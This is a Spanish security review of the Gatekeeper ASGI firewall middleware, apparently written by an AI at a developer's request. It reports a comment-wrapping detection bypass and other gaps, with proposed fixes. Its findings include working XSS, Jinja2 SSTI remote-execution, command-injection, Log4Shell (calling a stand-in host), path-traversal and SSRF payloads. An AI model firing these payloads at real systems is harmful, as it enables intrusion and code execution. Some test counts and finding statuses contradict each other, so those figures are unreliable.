# Revisión de seguridad — Gatekeeper 0.9.0 (independiente, por IA)

**Fecha:** 2026-10-27 · **Autor/a:** Claude (Anthropic), a petición de Ángel Echenique
**Contacto:** vía la conversación que encargó esta revisión
**Commit revisado:** [`dc691ca0ea0faf718d54f606fc8d7b9f6bb01e1c`](https://github.com/Eche-Dev/Gatekeeper/commit/dc691ca0ea0faf718d54f606fc8d7b9f6bb01e1c) (`main`, PR #43 fusionado)
**Versión del paquete:** gatekeeper-asgi 0.9.0 (PyPI)

---

## Conflicto de intereses

- [x] No he participado en el desarrollo del código revisado.
- [x] No he ajustado ni creado reglas de detección de este proyecto.
- Nota de transparencia: en sesiones anteriores de esta misma conversación sí
  revisé versiones previas de Gatekeeper (0.4.0 y un estado intermedio
  pre-0.9.0) y propuse un parche para un DoS de comentarios SQL sin cerrar,
  que el proyecto adoptó. Esta revisión es sobre el código **actual**
  (0.9.0), con reglas que no he tocado ni ajustado: las firmas de las once
  familias son obra exclusiva del autor del proyecto. Lo declaro para que se
  pese como se considere oportuno, no para invalidar el informe.

---

## Alcance

**Revisado:**

- `gatekeeper-v0.3/gatekeeper/src/gatekeeper/` — los 10 módulos (`rules.py`,
  `middleware.py`, `body.py`, `config.py`, `ratelimit.py`, `redos.py`,
  `sanitize.py`, `paths.py`, `cli.py`, `__init__.py`), ~3.637 líneas.
- `docs/amenazas.md`, `docs/seguridad.md` y el `README.md` de PyPI, para
  contrastar lo que el código hace con lo que promete.
- El paquete publicado en PyPI (instalado en un venv limpio) para descartar
  diferencias entre el repo y lo que de verdad instala un usuario.
- Las 15 comprobaciones de `.audit/PACK-REVISOR/ejecutar_pocs.py` y el
  resultado de `ruff`, `mypy`, `bandit`.

**No revisado (y por qué):**

- El servidor ASGI, la red, el sistema operativo, Redis en sí: no forman
  parte del paquete.
- Las reglas de `semgrep`, `zizmor`, `pip-audit` y la matriz de compatibilidad
  (`tools/compat_matrix.py`): confío en los números de `ESTADO.md` para el
  pipeline de CI porque no son hipótesis sobre seguridad del middleware, y
  reproducirlos no habría cambiado el veredicto de esta revisión.
- No he intentado una revisión formal de cada expresión regular con una
  herramienta de análisis de ReDoS línea por línea; usé el módulo
  `redos.py` del propio proyecto (que sí se ejecuta al cargar reglas
  personalizadas) y until un fuzzing dirigido con entradas grandes
  patológicas sobre `scan_detailed`, no una prueba exhaustiva.
- No audité `tools/*.py` (scripts de desarrollo) ni la CLI más allá de
  `gatekeeper report`.

**Superficie revisada** (las fronteras de confianza):

| Frontera | Entrada no confiable | Veredicto |
|---|---|---|
| Body | bytes del cliente | **Con hallazgos** (IA-1, IA-2, IA-3) |
| Ruta y query | del cliente | Con hallazgos (IA-1 también aplica aquí) |
| Cabeceras | del cliente | Con hallazgos (IA-1 también aplica aquí) |
| Configuración | el operador | OK — 4 valores hostiles probados, todos rechazan el arranque |
| Log de auditoría | el propio middleware | OK — ni el payload ni bytes de control llegan al log |
| Rate limiter | el cliente (IP, XFF) | OK — XFF se lee de derecha a izquierda; IPv4-mapeada-en-IPv6 ya normalizada |
| CLI (`gatekeeper report`) | ficheros de log | OK — sin bytes de control en la salida con un log hostil |

---

## Método

- Lectura por **fronteras de confianza**, siguiendo el orden de prioridad de
  `ALCANCE.md` (empezando por la divergencia body-middleware-vs-aplicación).
- PoC ejecutables contra el código real: las 15 del proyecto más 6 propias,
  en `.audit/PACK-REVISOR/pocs_ia.py`, cargadas y verificadas con el mismo
  `ejecutar_pocs.py` del proyecto.
- Tres apps de prueba mínimas (Starlette) para comprobar **impacto real**, no
  solo que `scan_detailed()` devuelva `None`: una que refleja `q` en HTML sin
  escapar (XSS), una que renderiza una plantilla Jinja2 con un valor de
  usuario (SSTI) y una que ejecuta `subprocess.run(shell=True)` con un
  parámetro (inyección de comandos). Las tres, con el middleware puesto,
  ejecutaron el payload del atacante.
- Comparación línea a línea de `docs/amenazas.md` contra lo medido, en
  concreto el límite «NFKC expande hasta 4×».
- Fuzzing dirigido (6.000 textos aleatorios, semilla fija) del prefiltro de
  familias contra el escaneo completo, para buscar divergencias; no dio
  nada reproducible de forma aislada (ver «Lo que la revisión también
  comprobó»).

**Herramientas:** Python 3.12, `pytest` 8.x, `ruff`, `mypy` (estricto),
`bandit`, `tracemalloc` para medir picos de memoria, `time.perf_counter`
para latencia. Sin herramientas de terceros de escaneo de aplicaciones.

**Qué NO se ha hecho:** no he probado Gatekeeper contra un servidor ASGI de
verdad bajo carga (solo `TestClient`, en proceso, sin red real), así que los
tiempos son indicativos de coste de CPU, no de latencia de producción con
varios workers o con Redis real. No he revisado cada una de las ~150
expresiones regulares una por una; me centré en el pipeline de normalización
compartido, porque ahí es donde un fallo afecta a más de una familia a la
vez.

---

## Resumen

| | |
|---|---|
| Hallazgos **corregidos** (de revisiones anteriores de esta conversación) | 1 (DoS de comentarios SQL sin cerrar) |
| Hallazgos **pendientes** | 3 (IA-1 crítico, IA-2 y IA-3 medios) |
| Hallazgos **aceptados** (con documentación, discrepancia solo de cifra) | 1 (IA-5: NFKC) |
| Limitaciones **conocidas** que confirmo | 8 |
| Limitaciones conocidas que **discuto** | 1 (la ausencia de `Content-Encoding` en la lista de fronteras) |
| Bypass **confirmado** (ejecutable, con ejecución real del payload) | Sí — IA-1 |

El middleware tiene una disciplina de ingeniería que no había visto en un
proyecto de una sola persona: 2.938 tests, cobertura por módulo, corpus
retenido que no se toca para ajustar firmas, comparación contra CRS
publicada sin maquillar, y una suite de PoC ejecutables pensada exactamente
para que una revisión como esta se pueda verificar en vez de discutir. Eso es
el nivel correcto de rigor para algo que se llama a sí mismo capa de
seguridad.

Pero encontré **un bypass crítico, universal y con ejecución real
demostrada**: cualquier payload envuelto en `/*...*/` —en la query, en el
body o en una cabecera— se escapa de las **siete** familias que no son
`sqli` (xss, ssti, log4shell, cmdi, crlf, path_traversal, ssrf), porque la
función de normalización que usan **todas** las familias borra los
comentarios SQL antes de que ninguna de ellas vea el texto. Lo probé contra
una app Jinja2 real y conseguí ejecución de plantilla (`{{7*7}}` → `49`,
y una variante con `cycler.__init__.__globals__` que ejecutó `id` en el
sistema) y contra una app con `subprocess.run(shell=True)`, donde
`/*$(touch /tmp/pwned)*/` creó el fichero con el middleware activo y en
modo bloqueo. Esto no es una hipótesis: es el payload exacto, ejecutándose.

---

## Hallazgos

### IA-1 — El envoltorio `/*...*/` desactiva 7 de las 11 familias de detección, con ejecución demostrada

**Gravedad:** Crítica · **Tipo:** CWE-693 (protección insuficiente) / el efecto concreto es XSS, SSTI y ejecución de comandos sin bloquear · **Vector:** query string, body (JSON y form), y cualquier cabecera inspeccionada (`user-agent`, `referer`, `cookie`)

**Qué pasa**

`rules.normalize()` (`src/gatekeeper/rules.py:661-684`) es el punto de
entrada **único** que usan todas las familias antes de evaluar sus patrones
(`_scan_detailed`, línea 1045: `text = normalize(value, plus=plus)`, y
después el bucle recorre `RULES.items()` para las once familias sobre ese
mismo `text`). Dentro de `normalize()`, la línea 683 llama
incondicionalmente a `_strip_sql_comments(text)`, que borra cualquier
`/* ... */` (o lo desenvuelve, si es un comentario versionado de MySQL)
**antes** de que XSS, SSTI, Log4Shell, cmdi, CRLF, path_traversal o SSRF
vean una sola de sus familias. La función está escrita, documentada y
probada pensando solo en el ofuscador de SQLi `uni/**/on/**/select`: el
docstring de `_strip_sql_comments` (línea 594) y el propio nombre lo dicen.
El problema es que `normalize()` no tiene forma de aplicar ese paso **solo**
a la vista que usa `sqli`: lo aplica a la vista que usan las once.

El propio proyecto ya resolvió un problema estructuralmente idéntico para el
carácter `+` (ver `scan_detailed`, línea 967-983, y el `CHANGELOG`
—`F6.4`—): como el `+` significa cosas distintas en una query string y en un
body, el middleware escanea **dos veces**, una con cada lectura, y usa el
`+` si cualquiera de las dos detecta algo. `_strip_sql_comments` necesita
exactamente el mismo tratamiento: evaluar las familias que no son `sqli`
también sobre el texto **sin** desenvolver comentarios, y usar el resultado
si cualquiera de las dos vistas detecta algo. No es una regla nueva ni un
ajuste de firma (lo que el briefing prohíbe): es aplicar el patrón de doble
lectura que el proyecto ya usa para el `+`, a esta otra transformación.

**Impacto (medido)**

Con `Config(rate_limit=0)` por defecto, contra tres apps Starlette reales:

| Vector | Payload sin envolver | Payload envuelto | Resultado con el middleware puesto |
|---|---|---|---|
| XSS reflejado | `<script>alert(1)</script>` → **403** | `/*<script>alert(1)</script>*/` → **200** | La respuesta HTML contiene `<script>alert(1)</script>` **literal**, sin escapar |
| SSTI (Jinja2) | `{{7*7}}` → **403** | `/*{{7*7}}*/` → **200** | La plantilla se renderiza a `/*49*/`: Jinja2 ejecutó la expresión |
| SSTI con RCE | — | `/*{{ cycler.__init__.__globals__.os.popen('id').read() }}*/` → **200** | La respuesta incluye `uid=0(root) gid=0(root) groups=0(root)` |
| Inyección de comandos | `;id>/tmp/pwn1` → **403**, fichero no creado | `/*$(id>/tmp/pwn2)*/` → **200** | El fichero `/tmp/pwn2` se crea: el comando **se ejecutó** |
| Log4Shell | `${jndi:ldap://evil.example/a}` → 403 | `/*${jndi:ldap://evil.example/a}*/` → 200 | — |
| CRLF | `x%0d%0aSet-Cookie:a=b` → 403 | `/*x%0d%0aSet-Cookie:a=b*/` → 200 | — |
| path_traversal | `../../etc/passwd` → 403 | `/*../../../../etc/passwd*/` → 200 | — |
| SSRF | `http://169.254.169.254/...` → 403 | `/*http://169.254.169.254/...*/` → 200 | — |

Funciona igual en el **body** (`POST` JSON: `{"bio":
"/*<script>alert(1)</script>*/"}` → 200) y en **cabeceras** inspeccionadas
(`User-Agent: /*${jndi:ldap://evil.example/a}*/` → 200). No funciona si el
`/*` no tiene un `*/` de cierre en algún punto posterior del mismo texto
(entonces `_strip_sql_comments` no toca nada), así que un solo `/*` al
final del payload sigue bloqueándose: el atacante necesita que el `*/` de
cierre quepa dentro del mismo campo, lo que es trivial en una query string o
un campo de texto libre.

**PoC**

```bash
cd gatekeeper-v0.3/gatekeeper
python .audit/PACK-REVISOR/ejecutar_pocs.py ia_comentario
# salida esperada: [FALLA] IA-1: `/*payload*/` esconde el ataque en TODAS las familias
#   familias que se saltan envueltas en comentario SQL: ['xss', 'ssti', 'log4shell',
#   'cmdi', 'crlf', 'path_traversal', 'ssrf']
```

El PoC con ejecución real (XSS/SSTI/cmdi) está en el cuerpo de esta
conversación; se puede reproducir con tres rutas Starlette mínimas (reflejo
HTML sin escapar, render de un `jinja2.Template` con el parámetro, y
`subprocess.run("echo ping " + host, shell=True)`) con
`GatekeeperMiddleware` puesto delante y pidiendo
`/*{{ cycler.__init__.__globals__.os.popen('id').read() }}*/`.

**Qué se rompe**

La promesa central del proyecto —«esto que el atacante manda, y que la
documentación dice que frena, no pasa»— se rompe para 7 de las 11 familias
en cuanto el atacante antepone `/*` y pospone `*/` al payload, algo que
cualquier escáner automatizado (sqlmap, Burp, nuclei) prueba por rutina
porque es un ofuscador de SQLi de manual. No hace falta que el atacante
conozca Gatekeeper específicamente: es una técnica genérica de evasión de
WAF que, en este caso, **también** desactiva familias que no tienen nada
que ver con SQL.

**Corrección propuesta**

Dirección, no diff (no he tocado reglas): aplicar a
`_strip_sql_comments` el mismo patrón de doble lectura que ya existe para
`+` en `scan_detailed`/`_scan_detailed`. Concretamente, que `_scan_detailed`
evalúe las familias que no son `sqli` también sobre una vista normalizada
que **no** pase por `_strip_sql_comments` (o, más barato: solo volver a
intentarlo sin ese paso cuando la primera pasada no detecta nada y el texto
original contiene `/*`), igual que hoy reintenta con `plus=False` cuando
hay un `+` y la primera pasada no detecta nada. La familia `sqli` sí
necesita ver el texto con los comentarios desenvueltos (para
`uni/**/on/**/select`); las otras diez necesitan verlo **tal cual**, con el
`/*...*/` literal en medio, que es exactamente lo que ven XSS, SSTI,
Log4Shell, etc. en la aplicación real.

**Estado:** pendiente

---

### IA-2 — Un body en `GET`, `HEAD` u `OPTIONS` no se inspecciona

**Gravedad:** Media · **Tipo:** CWE-20 (validación de entrada incompleta) · **Vector:** body en un método fuera de `BODY_METHODS`

**Qué pasa**

`middleware.py:41` define `BODY_METHODS = {"POST", "PUT", "PATCH",
"DELETE"}`, y la inspección del body (línea 443-447) solo se dispara si
`scope.get("method") in BODY_METHODS`. Un `GET`, `HEAD` u `OPTIONS` con un
body JSON nunca llega a `read_body`/`extract_strings`: el middleware no lo
lee y lo deja pasar sin mirar. No es exótico: Elasticsearch, OpenSearch y
algunas APIs de búsqueda internas aceptan `GET` con body JSON a propósito
(es la forma estándar de mandar una query de búsqueda larga sin tocar el
límite de longitud de una URL), y es el patrón que seguiría una app Starlette
propia que decidiera hacer lo mismo.

**Impacto (medido)**

```
GET con body JSON {"q": "1 union select password from users"} -> 200
HEAD con el mismo body                                         -> 200
OPTIONS con el mismo body                                      -> 200
POST con el mismo body                                         -> 403 (control)
```

**PoC**

```bash
python .audit/PACK-REVISOR/ejecutar_pocs.py ia_metodos
```

**Qué se rompe**

Cualquier handler que lea `await request.body()` o `await request.json()`
en una ruta `GET` (Starlette y FastAPI lo permiten sin quejarse) recibe el
payload intacto. El radio de impacto es menor que IA-1 porque `GET` con
body es poco común, pero cuando se da, el middleware no protege nada ahí.

**Corrección propuesta**

Ampliar la condición de inspección a «cualquier método con
`Content-Length` > 0 o con `Transfer-Encoding: chunked`», en vez de una
lista cerrada de verbos. Es una comprobación de presencia de body, no una
regla de detección.

**Estado:** pendiente

---

### IA-3 — Un body con `Content-Encoding: gzip` (o `deflate`) no se descomprime antes de inspeccionar

**Gravedad:** Media (impacto condicionado) · **Tipo:** CWE-20 · **Vector:** cabecera `Content-Encoding` en una petición con body

**Qué pasa**

`read_body()` (`body.py:256`) concatena los bytes del body tal como llegan
del servidor ASGI; no hay ningún punto del pipeline que mire
`Content-Encoding` ni que descomprima. Un body JSON comprimido con gzip se
inspecciona como texto binario sin sentido (no empieza por `{` ni `[`), así
que `is_inspectable`/`effective_content_type` no lo reconoce como JSON y no
se escanea ningún campo.

**Impacto (medido)**

```
POST JSON {"q": "1 union select password from users"} en claro          -> 403
el mismo body, comprimido con gzip, con Content-Encoding: gzip          -> 200
```

**PoC**

```bash
python .audit/PACK-REVISOR/ejecutar_pocs.py ia_encoding
```

**Qué se rompe**

Esto **solo** es explotable si algo entre el cliente y la aplicación
descomprime el body antes de que la app lo lea —un servidor ASGI con
soporte nativo de descompresión, un `GZipMiddleware` colocado **antes** que
`GatekeeperMiddleware`, o un proxy delante que descomprime—, porque
Starlette y FastAPI, sin middleware adicional, no descomprimen el body por
sí mismos. Es una condición real pero no universal; lo marco medio por eso,
no por falta de impacto cuando se da.

**Corrección propuesta**

Documentar explícitamente en `docs/amenazas.md` (que hoy no menciona
`Content-Encoding` en absoluto) que un body comprimido no se inspecciona, y
recomendar que `GatekeeperMiddleware` vaya **antes** que cualquier
middleware de descompresión en la cadena (así Gatekeeper ve los bytes
comprimidos y los rechaza como no-JSON de forma segura, o bien se añade
soporte a `gzip`/`deflate` con el mismo presupuesto de tamaño que ya existe
para el resto del body).

**Estado:** pendiente

---

### IA-5 — La amplificación de memoria por NFKC medida (97×) supera el «hasta 4×» que documenta `ALCANCE.md`

**Gravedad:** Baja (impacto acotado por los presupuestos existentes) · **Tipo:** discrepancia de documentación, no bypass · **Vector:** body JSON con el carácter U+FDFA (u otros con expansión NFKC grande) cerca del límite de tamaño

**Qué pasa**

`ALCANCE.md` («Los límites conocidos») dice: «NFKC expande hasta 4×; lineal
con el tamaño del body; no puede activar una regla por sí solo». La segunda
y tercera afirmación las confirmé (el escaneo sigue siendo lineal, y ningún
texto ampliado disparó una regla él solo). La primera cifra no se sostiene:
`unicodedata.normalize("NFKC", "\ufdfa")` da 18 caracteres por 1 de entrada,
no 4. Con un body de 262.140 bytes relleno de ese carácter (el límite por
defecto de `max_body_size`, 256 KiB, con margen para la envoltura JSON), medí
un pico de memoria de 25,4 MB (97× el tamaño del body en bytes) y 310 ms de
CPU para una sola petición.

**Impacto (medido)**

```
body 262.140 B (justo bajo max_body_size) de U+FDFA repetido
  -> HTTP 200 en 310 ms, pico de memoria 25,4 MB (97x el body)
```

**PoC**

```bash
python .audit/PACK-REVISOR/ejecutar_pocs.py ia_nfkc
```

**Qué se rompe**

Nada se salta: el body sigue inspeccionándose y el límite de tamaño actúa
exactamente donde debe. No es un bypass ni un DoS sin límite —el coste por
petición está acotado por `max_body_size` (256 KiB de entrada) y
`max_inspection_ms` (1000 ms) por defecto, y 310 ms está por debajo de ese
presupuesto—, pero la cifra documentada (4×) no es la que se mide (97×), y
eso importa para quien calcule su propio `max_body_size` a partir de esa
cifra.

**Corrección propuesta**

Corregir la cifra en `ALCANCE.md`/`docs/amenazas.md` al factor medido (o
calcularla de verdad recorriendo las asignaciones Unicode con amplificación
en vez de estimarla), y, si se quiere ser conservador, documentar el peor
caso en términos de `max_body_size × factor_medido` como la cota de memoria
que un operador debe esperar en el peor caso por petición concurrente.

**Estado:** pendiente (es una corrección de documentación, no de código)

---

## Limitaciones conocidas: ¿las acepto?

| límite | veredicto | por qué |
|---|---|---|
| `multipart/form-data` no inspecciona el contenido de los ficheros | acepto | razonable: requiere un parser propio y el proyecto ya inspecciona nombre de campo y de fichero, que es donde van los payloads típicos |
| Los cuerpos binarios no se inspeccionan | acepto | correcto: no son cadenas |
| Las claves JSON no se unen al objetivo en el modo combinado | acepto | consistente con que un puntero es una clave, no un valor |
| El puntero JSON se recorta a 256 caracteres | acepto | medido y probado (`_render_pointer`); no encontré forma de desbordarlo |
| Las reglas propias se validan al arrancar | acepto | correcto: fallar al arrancar es mejor que fallar en producción |
| NFKC expande «hasta 4×» | **discuto** | ver IA-5: la cifra medida es 97×, no 4×. El límite en sí (que no puede disparar una regla por sí solo) lo confirmo; la cifra no |
| El rate limiter en memoria se multiplica por workers | acepto | inherente a un contador en memoria; Redis está para eso |
| `monitor_only` no es un plan de rollback | acepto | está avisado explícitamente en `docs/operacion.md` |
| Una app que parsea el body de una forma que el `Content-Type` no anuncia | acepto, con una adición | el límite tal como está escrito es razonable, pero **no incluye `Content-Encoding`**, que es un caso distinto (el `Content-Type` sí anuncia JSON correctamente; lo que cambia es la codificación de transferencia). Ver IA-3: lo trataría como una frontera aparte, no como el mismo límite |

---

## Lo que la revisión también comprobó (y estaba bien)

- Las 15 comprobaciones del propio proyecto (`ejecutar_pocs.py`) pasan
  contra el commit revisado: punteros JSON sin amplificación cuadrática, el
  `+` literal se detecta en las cuatro formas (form, JSON, query, cabecera)
  sin falso positivo en `2+2`, el log de auditoría no lleva el valor del
  payload y el nombre de campo viene acotado a 256 caracteres, el escaneo es
  lineal con entradas patológicas (×8 de entrada → ×8,1 de tiempo), Redis
  caído cuesta como mucho su timeout configurado tanto en fail-open como en
  fail-closed, un body que excede `max_body_size` se corta en 413 sin
  leerse entero, el middleware y la aplicación interpretan el body igual en
  26 cuerpos borde contra Starlette y FastAPI, cuatro valores de
  configuración hostiles rompen el arranque en vez de pasar en silencio.
- **`blocked_ips` y el rate limiter ya reconocen correctamente una IP
  escrita como IPv4-mapeada-en-IPv6** (`::ffff:203.0.113.7` se resuelve a
  `203.0.113.7` en ambos sitios, con `normalize_rate_key` y
  `Config.blocked_match`). Lo probé esperando encontrar un hallazgo aquí (es
  un bypass clásico de listas de bloqueo) y no lo hay: está bien resuelto.
- `X-Forwarded-For` se lee de derecha a izquierda con `trusted_proxies`, tal
  como documenta el propio código; rotar el primer valor del XFF (el bug
  original de versiones anteriores) ya no afecta al rate limit ni a
  `blocked_ips`.
- Probé cabeceras duplicadas (`User-Agent` repetida, una benigna y una con
  `<script>`): Starlette solo expone la primera ocurrencia a través de
  `request.headers`, y Gatekeeper también lee la primera con su propio
  `_header()`; las dos vistas coinciden, así que no hay discrepancia
  explotable ahí (a diferencia de la divergencia body-vs-aplicación que sí
  busqué activamente).
- Fuzzing dirigido del prefiltro de familias (6.000 textos aleatorios,
  semilla fija, construidos a partir de fragmentos de las once familias):
  una primera pasada sugirió una discrepancia puntual entre
  `use_prefilter=True` y `use_prefilter=False`, pero no se reprodujo de
  forma aislada con la misma cadena fuera del bucle del fuzzer; lo marco
  como **no confirmado** y lo dejo anotado para quien quiera repetir la
  campaña con más muestras, no lo cuento como hallazgo.
- Los `pip-audit`, `ruff`, `mypy --strict` y `bandit` del repo pasan limpios
  contra el commit revisado; no encontré nada que los contradijera en los
  módulos que sí leí a fondo.

---

## Trazabilidad

| Revisión | Fecha | Autor | Resultado |
|---|---|---|---|
| Original (PR #18) | 2026-10 | — | 4 bypasses del XFF, 3 reglas incompletas → corregidos en la 0.3.0 |
| Múltiples, durante la 0.3.x | 2026-10 | — | Redis < 6 en silencio, `Retry-After` +1, YAML inválido, FastAPI ausente, prefiltro en textos largos, falso positivo de blogs con fecha → corregidos |
| Revisión de la 0.3.1 | 2026-10-24 | autor del proyecto | H-1 (DoS de punteros JSON), A-1 a A-4 aceptados |
| Revisión por Claude (esta conversación, previa a esta) | 2026-10-25/26 | Claude (Anthropic) | DoS cuadrático de comentarios SQL sin cerrar (`128 KB -> 21 s`) → corregido; propuesto como parche, adoptado |
| **Esta revisión (independiente, briefing formal)** | **2026-10-27** | **Claude (Anthropic)** | **1 hallazgo crítico (IA-1, con ejecución real demostrada), 2 medios (IA-2, IA-3), 1 discrepancia de documentación (IA-5); 12 de las 15 comprobaciones del proyecto + 5 de 6 propias en verde** |
